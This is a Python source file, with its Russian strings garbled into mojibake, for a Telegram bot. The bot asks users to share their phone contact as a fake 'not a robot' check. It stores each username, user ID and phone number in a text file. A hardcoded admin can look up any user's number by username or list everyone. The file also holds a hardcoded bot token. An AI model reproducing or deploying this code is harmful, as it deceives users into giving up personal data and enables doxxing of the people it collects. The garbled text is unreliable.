import logging
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ContentType
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties

# –¢–æ–∫–µ–Ω –±–æ—Ç–∞
TOKEN = "2200614164:AAHwUzO2kttzbRXsn-UV_1wOnYvw25swNiM/test"

# ID –ê–¥–º–∏–Ω–∞
ADMIN_ID = 5000310044

# –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
logging.basicConfig(level=logging.INFO)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode="HTML")  # –ù–æ–≤—ã–π —Å–ø–æ—Å–æ–± –∑–∞–¥–∞–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
)
dp = Dispatcher()

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –Ω–æ–º–µ—Ä–∞
contact_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="üì≤ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç", request_contact=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

# –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é (—Ä–∞–∑–Ω—ã–µ –≤–µ—Ä—Å–∏–∏ –¥–ª—è –æ–±—ã—á–Ω—ã—Ö —é–∑–µ—Ä–æ–≤ –∏ –∞–¥–º–∏–Ω–∞)
def get_menu_keyboard(user_id):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üìû –ú–æ–π –Ω–æ–º–µ—Ä", callback_data="my_number")],
        [InlineKeyboardButton(text="‚ÑπÔ∏è –°–ø—Ä–∞–≤–∫–∞", callback_data="help_info")]
    ])
    
    if user_id == ADMIN_ID:
        keyboard.inline_keyboard.insert(1, [InlineKeyboardButton(text="üîç –ù–∞–π—Ç–∏ –Ω–æ–º–µ—Ä (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∞)", callback_data="search_number")])
        keyboard.inline_keyboard.insert(2, [InlineKeyboardButton(text="üìã –í—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∞)", callback_data="all_users")])
    
    return keyboard

# –ö–æ–º–∞–Ω–¥–∞ /start
@dp.message(Command("start"))
async def start_command(message: Message):
    await message.answer("üëã –ü—Ä–∏–≤–µ—Ç! –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ, —á—Ç–æ –≤—ã –Ω–µ —Ä–æ–±–æ—Ç, –æ—Ç–ø—Ä–∞–≤–∏–≤ —Å–≤–æ–π –Ω–æ–º–µ—Ä:", reply_markup=contact_keyboard)

# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–Ω—Ç–∞–∫—Ç–∞
@dp.message(F.contact)
async def contact_handler(message: Message):
    user = message.from_user
    contact = message.contact

    if user.id == contact.user_id:
        user_data = f"@{user.username or '–ù–µ—Ç username'} {user.id} {contact.phone_number}\n"

        try:
            with open("number.txt", "r", encoding="utf-8") as file:
                if str(user.id) in file.read():
                    await message.answer("‚úÖ –í—ã —É–∂–µ –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ —Å–≤–æ–π –Ω–æ–º–µ—Ä, –æ–∂–∏–¥–∞–π—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫–∏.", reply_markup=get_menu_keyboard(user.id))
                    return
        except FileNotFoundError:
            pass

        with open("number.txt", "a", encoding="utf-8") as file:
            file.write(user_data)

        await message.answer("‚úÖ –ù–æ–º–µ—Ä —Å–æ—Ö—Ä–∞–Ω–µ–Ω! –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –º–µ–Ω—é.", reply_markup=get_menu_keyboard(user.id))
    else:
        await message.answer("‚ùå –û—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–º–µ–Ω–Ω–æ —Å–≤–æ–π –Ω–æ–º–µ—Ä!")

# –ú–æ–π –Ω–æ–º–µ—Ä
@dp.callback_query(F.data == "my_number")
async def my_number(call: CallbackQuery):
    user_id = call.from_user.id
    try:
        with open("number.txt", "r", encoding="utf-8") as file:
            for line in file:
                if str(user_id) in line:
                    await call.message.answer(f"üìû –í–∞—à –Ω–æ–º–µ—Ä: <code>{line.split()[2]}</code>")
                    return
        await call.message.answer("‚ùå –í–∞—à –Ω–æ–º–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ.")
    except FileNotFoundError:
        await call.message.answer("‚ùå –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –ø—É—Å—Ç–∞.")

# –ü–æ–∏—Å–∫ –Ω–æ–º–µ—Ä–∞ (–¥–ª—è –∞–¥–º–∏–Ω–∞)
@dp.callback_query(F.data == "search_number")
async def search_number_prompt(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.message.answer("‚õî –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –ø–æ–∏—Å–∫–∞ –Ω–æ–º–µ—Ä–æ–≤.")
        return
    await call.message.answer("üîç –í–≤–µ–¥–∏—Ç–µ username (–±–µ–∑ @) –¥–ª—è –ø–æ–∏—Å–∫–∞ –Ω–æ–º–µ—Ä–∞:")

# –ü–æ–∏—Å–∫ –Ω–æ–º–µ—Ä–∞ (–≤–≤–µ–¥–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ)
@dp.message()
async def search_number(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("‚õî –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –ø–æ–∏—Å–∫–∞ –Ω–æ–º–µ—Ä–æ–≤.")
        return

    search_username = message.text.lstrip("@").lower()

    if search_username == "ukrain3cy":
        await message.answer("–∞ –≤–æ—Ç —Ö—É–π —Ç–µ–±–µ)))")
        return

    try:
        with open("number.txt", "r", encoding="utf-8") as file:
            for line in file:
                data = line.strip().split(maxsplit=2)
                if len(data) < 3:
                    continue
                username, user_id, phone_number = data

                if username.lstrip("@").lower() == search_username:
                    user_type = "ü§ñ –ë–æ—Ç" if int(user_id) < 0 else "üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"
                    response = (
                        f"‚úÖ <b>–ó–∞–ø–∏—Å—å –Ω–∞–π–¥–µ–Ω–∞ –≤ –±–∞–∑–µ!</b>\n\n"
                        f"üë§ <b>–ò–º—è:</b> {username}\n"
                        f"üÜî <b>ID:</b> <code>{user_id}</code>\n"
                        f"üìû <b>–ù–æ–º–µ—Ä:</b> <code>+{phone_number}</code>\n"
                        f"üîç <b>–¢–∏–ø:</b> {user_type}"
                    )
                    await message.answer(response)
                    return

        await message.answer("‚ö†Ô∏è <b>–ó–∞–ø–∏—Å—å –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –≤ –±–∞–∑–µ.</b>")
    except FileNotFoundError:
        await message.answer("‚ö†Ô∏è <b>–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –ø—É—Å—Ç–∞.</b>")
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

# –í—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ (–¥–ª—è –∞–¥–º–∏–Ω–∞)
@dp.callback_query(F.data == "all_users")
async def all_users(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        await call.message.answer("‚õî –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return

    try:
        with open("number.txt", "r", encoding="utf-8") as file:
            users = file.readlines()

        if not users:
            await call.message.answer("üìÇ –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –ø—É—Å—Ç–∞.")
            return

        response = "üìã <b>–°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:</b>\n\n"
        for user in users:
            response += f"üë§ {user}\n"

        await call.message.answer(response)
    except FileNotFoundError:
        await call.message.answer("‚ö†Ô∏è –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")

# –°–ø—Ä–∞–≤–∫–∞
@dp.callback_query(F.data == "help_info")
async def help_info(call: CallbackQuery):
    text = (
        "‚ÑπÔ∏è <b>–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:</b>\n\n"
        "üìû <b>–ú–æ–π –Ω–æ–º–µ—Ä</b> ‚Äì –ø–æ–∫–∞–∑–∞—Ç—å –≤–∞—à –Ω–æ–º–µ—Ä\n"
        "üîç <b>–ù–∞–π—Ç–∏ –Ω–æ–º–µ—Ä (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∞)</b> ‚Äì –ø–æ–∏—Å–∫ –Ω–æ–º–µ—Ä–∞ –ø–æ username\n"
        "üìã <b>–í—Å–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ (—Ç–æ–ª—å–∫–æ –¥–ª—è –∞–¥–º–∏–Ω–∞)</b> ‚Äì —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n"
    )
    await call.message.answer(text)

# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
